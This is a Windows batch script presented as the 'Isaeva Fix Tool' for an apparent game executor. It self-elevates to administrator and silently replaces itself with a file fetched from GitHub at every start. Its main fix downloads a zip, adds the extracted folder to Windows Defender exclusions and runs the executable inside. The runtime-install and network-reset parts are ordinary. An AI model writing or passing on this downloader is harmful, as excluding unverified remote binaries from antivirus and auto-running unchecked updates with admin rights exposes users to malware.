@echo off
setlocal enabledelayedexpansion
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

REM Auto-Update Check (runs once at startup, not in loop)
if "%1"=="--skip-update" goto :MAIN_MENU
if "%1"=="--updated" goto :MAIN_MENU

set "CURRENT_VERSION=2.1.0"
set "SCRIPT_DIR=%~dp0"
set "SCRIPT_NAME=IsaevaFix.bat"
set "VERSION_URL=https://raw.githubusercontent.com/FixBats/FixIsaevabat/main/version.txt"
set "BAT_URL=https://raw.githubusercontent.com/FixBats/FixIsaevabat/main/IsaevaFix.bat"
set "UPDATE_TEMP=%TEMP%\IsaevaFix_new.bat"
set "BACKUP_DIR=%SCRIPT_DIR%backup"
set "UPDATE_CHECKER=%TEMP%\update_check.txt"

REM Check for updates silently on startup
call :CHECK_UPDATE_SILENT

title Isaeva Fix Tool v%CURRENT_VERSION%
color 5

:MAIN_MENU
cls
echo =====================================
echo          Isaeva Fix Tool
echo          Version: %CURRENT_VERSION%
echo =====================================
echo.
echo Select the fix you want to apply:
echo.
echo   1. Isaeva Installer / Executor Fix
echo   2. Login / Injection Fix
echo   3. Install All Runtimes / Dependencies
echo   4. Check for Updates
echo   5. Restore from Backup
echo   6. Exit
echo.
set /p CHOICE=Enter your choice (1-6): 
if "%CHOICE%"=="1" goto :ISAEVA_FIX
if "%CHOICE%"=="2" goto :LOGIN_INJECTION_FIX
if "%CHOICE%"=="3" goto :RUNTIME_FIX
if "%CHOICE%"=="4" goto :CHECK_UPDATE_MANUAL
if "%CHOICE%"=="5" goto :RESTORE_BACKUP
if "%CHOICE%"=="6" exit /b
echo Invalid choice. Please try again.
timeout /t 2 >nul
goto :MAIN_MENU

REM ====== AUTO-UPDATE FUNCTIONS ======

:CHECK_UPDATE_SILENT
REM Check silently, no output
powershell -ExecutionPolicy Bypass -Command "^
try {^
    $remote = (Invoke-WebRequest -Uri '%VERSION_URL%' -UseBasicParsing -TimeoutSec 5).Content.Trim();^
    Write-Host $remote;^
} catch {^
    Write-Host '%CURRENT_VERSION%';^
}^
" > "%UPDATE_CHECKER%"

for /f "tokens=*" %%A in ('type "%UPDATE_CHECKER%"') do set "LATEST_VERSION=%%A"
del /F /Q "%UPDATE_CHECKER%" >nul 2>&1

if "%LATEST_VERSION%"=="" set "LATEST_VERSION=%CURRENT_VERSION%"

if not "%LATEST_VERSION%"=="%CURRENT_VERSION%" (
    call :PERFORM_UPDATE
)
exit /b

:CHECK_UPDATE_MANUAL
cls
echo =====================================
echo       Check for Updates
echo =====================================
echo.
echo Checking for updates from GitHub...
timeout /t 1 /nobreak >nul

powershell -ExecutionPolicy Bypass -Command "^
try {^
    $remote = (Invoke-WebRequest -Uri '%VERSION_URL%' -UseBasicParsing -TimeoutSec 5).Content.Trim();^
    Write-Host $remote;^
} catch {^
    Write-Host '%CURRENT_VERSION%';^
}^
" > "%UPDATE_CHECKER%"

for /f "tokens=*" %%A in ('type "%UPDATE_CHECKER%"') do set "LATEST_VERSION=%%A"
del /F /Q "%UPDATE_CHECKER%" >nul 2>&1

if "%LATEST_VERSION%"=="" (
    echo [ERROR] Could not reach GitHub. Check your internet connection.
    timeout /t 3 /nobreak >nul
    goto :MAIN_MENU
)

echo.
echo Current Version: %CURRENT_VERSION%
echo Latest Version:  %LATEST_VERSION%
echo.

if "%LATEST_VERSION%"=="%CURRENT_VERSION%" (
    echo Status: UP-TO-DATE
    echo.
    timeout /t 2 /nobreak >nul
    goto :MAIN_MENU
) else (
    echo Status: UPDATE AVAILABLE
    echo.
    set /p UPDATE=Do you want to update now? (Y/N): 
    if /I not "%UPDATE%"=="Y" (
        goto :MAIN_MENU
    )
    call :PERFORM_UPDATE
)

:PERFORM_UPDATE
if not exist "%BACKUP_DIR%" mkdir "%BACKUP_DIR%"

echo.
echo [1/4] Creating backup of current version...
set "BACKUP_FILE=%BACKUP_DIR%\IsaevaFix.bat.%CURRENT_VERSION%.bak"
copy "%SCRIPT_DIR%%SCRIPT_NAME%" "%BACKUP_FILE%" >nul 2>&1
echo Backup created: %BACKUP_FILE%

echo.
echo [2/4] Downloading latest version from GitHub...
powershell -ExecutionPolicy Bypass -Command "^
try {^
    Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%UPDATE_TEMP%' -UseBasicParsing -TimeoutSec 10;^
    Write-Host 'SUCCESS';^
} catch {^
    Write-Host 'FAILED';^
}^
" > "%UPDATE_CHECKER%"

for /f "tokens=*" %%A in ('type "%UPDATE_CHECKER%"') do set "DOWNLOAD_STATUS=%%A"
del /F /Q "%UPDATE_CHECKER%" >nul 2>&1

if not "%DOWNLOAD_STATUS%"=="SUCCESS" (
    echo [ERROR] Download failed. Restoring from backup...
    copy "%BACKUP_FILE%" "%SCRIPT_DIR%%SCRIPT_NAME%" /Y >nul 2>&1
    echo Restored to v%CURRENT_VERSION%
    timeout /t 3 /nobreak >nul
    goto :MAIN_MENU
)

if not exist "%UPDATE_TEMP%" (
    echo [ERROR] File not found after download.
    timeout /t 3 /nobreak >nul
    goto :MAIN_MENU
)

echo.
echo [3/4] Verifying and installing update...
copy "%UPDATE_TEMP%" "%SCRIPT_DIR%%SCRIPT_NAME%" /Y >nul 2>&1
del /F /Q "%UPDATE_TEMP%" >nul 2>&1

echo.
echo [4/4] Update completed. Restarting...
echo.
timeout /t 2 /nobreak >nul

REM Restart with --updated flag to skip update check
start "" "%SCRIPT_DIR%%SCRIPT_NAME%" --updated
exit /b

:RESTORE_BACKUP
cls
echo =====================================
echo       Restore from Backup
echo =====================================
echo.

if not exist "%BACKUP_DIR%" (
    echo No backups found.
    timeout /t 2 /nobreak >nul
    goto :MAIN_MENU
)

echo Available backups:
echo.
for /f "tokens=*" %%A in ('dir /b "%BACKUP_DIR%"') do (
    echo   %%A
)
echo.
set /p BACKUP_FILE=Enter backup filename: 

if not exist "%BACKUP_DIR%\%BACKUP_FILE%" (
    echo File not found.
    timeout /t 2 /nobreak >nul
    goto :MAIN_MENU
)

echo.
echo Restoring from backup...
copy "%BACKUP_DIR%\%BACKUP_FILE%" "%SCRIPT_DIR%%SCRIPT_NAME%" /Y >nul
echo Done. Restart the script.
timeout /t 3 /nobreak >nul
goto :MAIN_MENU

REM ====== ORIGINAL MENU OPTIONS ======

:ISAEVA_FIX
cls
echo =====================================
echo   Isaeva Installer / Executor Fix
echo =====================================
echo.
echo This will:
echo   - Close Isaeva.exe if it is running.
echo   - Delete any existing Isaeva folder or Isaeva.exe on Desktop.
echo   - Download the latest Isaeva package.
echo   - Extract it to your Desktop.
echo   - Add the Isaeva folder to Windows Defender exclusions.
echo   - Launch Isaeva.exe.
echo.
set /p CONFIRM=Do you want to continue? (Y/N): 
if /I not "%CONFIRM%"=="Y" (
    echo Operation cancelled.
    timeout /t 3 /nobreak >nul
    goto :MAIN_MENU
)

echo.
echo [1/6] Closing Isaeva.exe if running...
taskkill /F /IM Isaeva.exe >nul 2>&1
timeout /t 2 /nobreak >nul

echo.
echo [2/6] Cleaning old Isaeva files from Desktop...
set "DESKTOP=%USERPROFILE%\Desktop"
if exist "%DESKTOP%\Isaeva" (
    rmdir /s /q "%DESKTOP%\Isaeva"
    echo Deleted Isaeva folder.
)
if exist "%DESKTOP%\Isaeva.exe" (
    del /F /Q "%DESKTOP%\Isaeva.exe"
    echo Deleted Isaeva.exe.
)

echo.
echo [3/6] Downloading Isaeva package...
set "ZIP_PATH=%TEMP%\Isaeva.zip"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/FixBats/FixIsaevabat/releases/download/Executor/Isaeva.zip' -OutFile '%ZIP_PATH%' -UseBasicParsing"
if not exist "%ZIP_PATH%" (
    echo [ERROR] Failed to download the package.
    timeout /t 3 /nobreak >nul
    goto :MAIN_MENU
)

echo.
echo [4/6] Extracting to Desktop...
powershell -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%DESKTOP%' -Force"
del /F /Q "%ZIP_PATH%" >nul 2>&1

set "ISAEVA_FOLDER=%DESKTOP%\Isaeva"
if not exist "%ISAEVA_FOLDER%" (
    echo [WARNING] Isaeva folder not found on Desktop. Skipping Defender exclusion.
    goto :SKIP_EXCLUSION
)

echo.
echo [5/6] Adding Isaeva folder to Windows Defender exclusions...
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%ISAEVA_FOLDER%'" >nul 2>&1
if %errorLevel% equ 0 (
    echo Successfully added to exclusions.
) else (
    echo Failed to add exclusion. You may need to add it manually.
)

:SKIP_EXCLUSION
echo.
echo [6/6] Locating Isaeva.exe...
set "ISAEVA_EXE="
if exist "%ISAEVA_FOLDER%\Isaeva.exe" set "ISAEVA_EXE=%ISAEVA_FOLDER%\Isaeva.exe"
if not defined ISAEVA_EXE if exist "%DESKTOP%\Isaeva.exe" set "ISAEVA_EXE=%DESKTOP%\Isaeva.exe"

if not defined ISAEVA_EXE (
    echo [ERROR] Isaeva.exe was not found after extraction.
    echo Please check your Desktop and run it manually.
    timeout /t 3 /nobreak >nul
    goto :MAIN_MENU
)

echo.
echo Launching Isaeva.exe...
start "" "%ISAEVA_EXE%"

echo.
echo =====================================
echo       ISAEVA FIX COMPLETED
echo =====================================
echo.
timeout /t 3 /nobreak >nul
goto :MAIN_MENU

:LOGIN_INJECTION_FIX
cls
echo =====================================
echo       Login / Injection Fix
echo =====================================
echo.
echo This will reset your network settings and sync your system time.
echo Commands to be executed:
echo   - ipconfig /flushdns
echo   - ipconfig /release
echo   - ipconfig /renew
echo   - netsh winsock reset
echo   - netsh int ip reset
echo   - w32tm /resync (time sync)
echo.
set /p CONFIRM=Do you want to continue? (Y/N): 
if /I not "%CONFIRM%"=="Y" (
    echo Operation cancelled.
    timeout /t 3 /nobreak >nul
    goto :MAIN_MENU
)
echo.
echo Flushing DNS cache...
ipconfig /flushdns
echo.
echo Releasing current IP address...
ipconfig /release
echo.
echo Renewing IP address...
ipconfig /renew
echo.
echo Resetting Winsock catalog...
netsh winsock reset
echo.
echo Resetting TCP/IP stack...
netsh int ip reset
echo.
echo Syncing system time...
net stop w32time >nul 2>&1
w32tm /unregister >nul 2>&1
w32tm /register >nul 2>&1
net start w32time >nul 2>&1
w32tm /config /manualpeerlist:"time.windows.com" /syncfromflags:manual /reliable:YES /update >nul 2>&1
w32tm /resync /force >nul 2>&1
echo.
echo Time sync completed.
echo.
echo All fixes applied. It is recommended to restart your PC.
echo.
timeout /t 3 /nobreak >nul
goto :MAIN_MENU

:RUNTIME_FIX
cls
echo =====================================
echo   Install Runtimes / Dependencies
echo =====================================
echo.
echo This will download and install:
echo   - Visual C++ 2005-2022 Redistributables (x86 ^& x64)
echo   - Microsoft .NET Framework 3.5 and 4.8
echo   - DirectX End-User Runtime
echo.
echo All installations will run silently.
echo.
set /p CONFIRM=Do you want to continue? (Y/N): 
if /I not "%CONFIRM%"=="Y" (
    echo Operation cancelled.
    timeout /t 3 /nobreak >nul
    goto :MAIN_MENU
)

set "TEMP_DIR=%TEMP%\Runtime_Fix"
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"

echo.
echo Downloading Visual C++ 2005 Redistributable (x86)...
set "URL=https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x86.EXE"
set "FILE=%TEMP_DIR%\vc2005_x86.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /q
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2005 Redistributable (x64)...
set "URL=https://download.microsoft.com/download/8/B/4/8B42259F-5D70-43F4-AC2E-4B208FD8D66A/vcredist_x64.EXE"
set "FILE=%TEMP_DIR%\vc2005_x64.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /q
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2008 Redistributable (x86)...
set "URL=https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x86.exe"
set "FILE=%TEMP_DIR%\vc2008_x86.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /q /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2008 Redistributable (x64)...
set "URL=https://download.microsoft.com/download/5/D/8/5D8C65CB-C849-4025-8E95-C3966CAFD8AE/vcredist_x64.exe"
set "FILE=%TEMP_DIR%\vc2008_x64.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /q /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2010 Redistributable (x86)...
set "URL=https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe"
set "FILE=%TEMP_DIR%\vc2010_x86.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /q /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2010 Redistributable (x64)...
set "URL=https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x64.exe"
set "FILE=%TEMP_DIR%\vc2010_x64.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /q /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2012 Redistributable (x86)...
set "URL=https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x86.exe"
set "FILE=%TEMP_DIR%\vc2012_x86.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /install /quiet /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2012 Redistributable (x64)...
set "URL=https://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU_4/vcredist_x64.exe"
set "FILE=%TEMP_DIR%\vc2012_x64.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /install /quiet /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2013 Redistributable (x86)...
set "URL=https://aka.ms/highcontrast/2013/vc_redist.x86.exe"
set "FILE=%TEMP_DIR%\vc2013_x86.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /install /quiet /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2013 Redistributable (x64)...
set "URL=https://aka.ms/highcontrast/2013/vc_redist.x64.exe"
set "FILE=%TEMP_DIR%\vc2013_x64.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /install /quiet /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2015-2022 Redistributable (x86)...
set "URL=https://aka.ms/vs/17/release/vc_redist.x86.exe"
set "FILE=%TEMP_DIR%\vc2015_2022_x86.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /install /quiet /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading Visual C++ 2015-2022 Redistributable (x64)...
set "URL=https://aka.ms/vs/17/release/vc_redist.x64.exe"
set "FILE=%TEMP_DIR%\vc2015_2022_x64.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /install /quiet /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Enabling .NET Framework 3.5...
Dism /online /Enable-Feature /FeatureName:NetFx3 /All /NoRestart

echo.
echo Downloading .NET Framework 4.8...
set "URL=https://go.microsoft.com/fwlink/?linkid=2088631"
set "FILE=%TEMP_DIR%\dotnet48.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /q /norestart
) else (
    echo Failed to download. Skipping.
)

echo.
echo Downloading DirectX End-User Runtime...
set "URL=https://download.microsoft.com/download/1/7/1/1718CCC4-6315-4D8E-9543-8E28A4E18C4C/dxwebsetup.exe"
set "FILE=%TEMP_DIR%\dxwebsetup.exe"
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing"
if exist "%FILE%" (
    echo Installing...
    start /wait "" "%FILE%" /Q
) else (
    echo Failed to download. Skipping.
)

echo.
echo Cleaning up temporary files...
rmdir /s /q "%TEMP_DIR%" >nul 2>&1

echo.
echo =====================================
echo   RUNTIME INSTALLATION COMPLETED
echo =====================================
echo.
timeout /t 3 /nobreak >nul
goto :MAIN_MENU
